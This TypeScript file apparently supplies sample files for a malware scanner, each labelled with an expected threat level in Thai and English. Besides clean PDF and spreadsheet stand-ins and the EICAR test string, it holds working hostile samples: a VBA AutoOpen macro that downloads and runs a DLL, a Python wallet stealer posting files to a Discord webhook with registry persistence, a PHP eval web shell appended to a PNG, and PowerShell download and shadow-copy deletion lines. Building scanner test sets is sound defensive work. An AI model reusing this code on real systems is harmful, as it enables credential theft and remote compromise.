export interface SampleFileItem {
  name: string;
  category: 'Safe Document' | 'Malware Dropper' | 'Weaponized Macro' | 'Infostealer Script' | 'Standard Test File' | 'Disguised Media';
  tag: string;
  expectedThreat: 'clean' | 'suspicious' | 'malicious' | 'critical';
  descriptionTh: string;
  descriptionEn: string;
  content: string; // text or base64
  isBase64?: boolean;
}

export const SAMPLE_FILES: SampleFileItem[] = [
  {
    name: 'Clean_Monthly_Invoice_2026.pdf',
    category: 'Safe Document',
    tag: 'ปลอดภัย (Clean)',
    expectedThreat: 'clean',
    descriptionTh: 'ไฟล์ใบแจ้งหนี้ PDF ปกติ ไม่มีสคริปต์แฝงหรือมาโครอันตราย',
    descriptionEn: 'Standard PDF invoice with verified metadata and safe document structure.',
    content: `%PDF-1.7
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>
endobj
4 0 obj
<< /Length 124 >>
stream
BT
/F1 18 Tf
50 700 Td
(TAX INVOICE - ACME CORP - TOTAL: $1,450.00 USD - STATUS: PAID) Tj
ET
endstream
endobj
xref
0 5
0000000000 65535 f 
0000000010 00000 n 
0000000060 00000 n 
0000000118 00000 n 
0000000205 00000 n 
trailer
<< /Size 5 /Root 1 0 R >>
%%EOF`,
  },
  {
    name: 'SysUpdate_Installer_x64.exe',
    category: 'Malware Dropper',
    tag: 'วิกฤต (Critical Trojan)',
    expectedThreat: 'critical',
    descriptionTh: 'ไฟล์ปฏิบัติการแฝงคำสั่งปิดระบบ Shadow Copy และดึงโค้ด PowerShell ซ่อนหน้าต่าง',
    descriptionEn: 'Trojan payload attempting PowerShell stealth download cradles and VSS shadow copy deletion.',
    content: `MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xFF\xFF\x00\x00\xB8\x00\x00\x00\x00\x00\x00\x00
This program cannot be run in DOS mode.
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand aAB0AHQAcAA6AC8ALwBtAGEAbABpAGMAaQBvAHUAcwAtAGQAbwBtAGEAaQBuAC4AcgB1AC8AcABhAHkAbABvAGEAZAAuAGIAaQBuAA==
vssadmin.exe delete shadows /all /quiet
wbadmin.exe delete catalog -quiet
VirtualAlloc
WriteProcessMemory
CreateRemoteThread
HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
http://91.240.118.42:8080/stage2_shell.bin
ProcessHollowing NtUnmapViewOfSection`,
  },
  {
    name: 'Payroll_Bonus_Macro_Enabled.docm',
    category: 'Weaponized Macro',
    tag: 'มัลแวร์มาโคร (Weaponized)',
    expectedThreat: 'malicious',
    descriptionTh: 'ไฟล์เอกสารมาโครที่ฝังคำสั่ง AutoOpen เพื่อดาวน์โหลดไฟล์ DLL ผ่าน WScript.Shell',
    descriptionEn: 'Weaponized Microsoft Office document with malicious AutoOpen macro cradle.',
    content: `PK\x03\x04\x14\x00\x06\x00\x08\x00\x00\x00
word/vbaProject.bin
Sub AutoOpen()
    Dim wShell As Object
    Set wShell = CreateObject("WScript.Shell")
    Dim cmd As String
    cmd = "cmd.exe /c curl -sSL http://evil-cdn-hosting.top/update.dll -o %TEMP%\\update.dll && rundll32.exe %TEMP%\\update.dll,EntryPoint"
    wShell.Run cmd, 0, False
    MsgBox "Macro security certificate updated.", vbInformation
End Sub
Sub Document_Open()
    AutoOpen
End Sub`,
  },
  {
    name: 'crypto_wallet_stealer_v2.py',
    category: 'Infostealer Script',
    tag: 'สคริปต์อันตราย (Infostealer)',
    expectedThreat: 'malicious',
    descriptionTh: 'สคริปต์ Python ขโมยคีย์กระเป๋าเงินคริปโต และข้อมูลเบราว์เซอร์ส่งเข้า Webhook',
    descriptionEn: 'Python infostealer searching for browser credentials, seed phrases, and crypto wallets.',
    content: `import os, sys, requests, base64

TARGET_WALLETS = ["wallet.dat", "metamask", "exodus", "electrum"]
WEBHOOK_URL = "https://discord.com/api/webhooks/982348239482/steal-dump"

def dump_credentials():
    appdata = os.environ.get('APPDATA', '')
    found_tokens = []
    for root, dirs, files in os.walk(appdata):
        for f in files:
            if any(w in f.lower() for w in TARGET_WALLETS):
                full_path = os.path.join(root, f)
                with open(full_path, 'rb') as fp:
                    data = fp.read()
                    requests.post(WEBHOOK_URL, files={'file': data})
    # Persistence via Registry Run
    os.system('reg add "HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run" /v "CryptoGuard" /d "python %s" /f' % sys.argv[0])

if __name__ == '__main__':
    dump_credentials()`,
  },
  {
    name: 'eicar_standard_av_test.com',
    category: 'Standard Test File',
    tag: 'มาตรฐานสากล (EICAR Test)',
    expectedThreat: 'critical',
    descriptionTh: 'รหัสทดสอบมาตรฐานสากลของ European Institute for Computer Antivirus Research',
    descriptionEn: 'The official EICAR test string for verifying antivirus and antimalware engines safe testing.',
    content: `X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*`,
  },
  {
    name: 'profile_avatar_stego.png',
    category: 'Disguised Media',
    tag: 'ซ่อนโค้ด (Steganography)',
    expectedThreat: 'suspicious',
    descriptionTh: 'ไฟล์ภาพ PNG ที่มีโค้ดสคริปต์ PHP Web Shell แอบต่อท้ายไฟล์ (Polyglot / Stego)',
    descriptionEn: 'PNG image with trailing appended PHP webshell payload and eval execution.',
    content: `\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x10\x00\x00\x00\x10\x08\x06\x00\x00\x00\x1f\xf3\xffa\x00\x00\x00\x00IEND\xaeB\`\x82
<?php 
if(isset($_POST['cmd'])) {
    $x = base64_decode($_POST['cmd']);
    eval($x);
}
?>`,
  },
  {
    name: 'Quarterly_Financial_Audit.xlsx',
    category: 'Safe Document',
    tag: 'ปลอดภัย (Clean)',
    expectedThreat: 'clean',
    descriptionTh: 'สเปรดชีตการเงิน Excel ปกติ ไม่พบการเรียกใช้งานภายนอกหรือแมโคร',
    descriptionEn: 'Standard spreadsheet document with clean XML schema and verified data table sheets.',
    content: `PK\x03\x04\x14\x00\x00\x00\x08\x00
[Content_Types].xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
<Default Extension="xml" ContentType="application/xml"/>
<Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
</Types>
xl/worksheets/sheet1.xml: Financial summary Q3 FY2026. Gross Revenue: 4,820,000 THB. Expenses: 2,150,000 THB. Net Profit: 2,670,000 THB. Audited by Certified Public Accountant.`,
  },
];
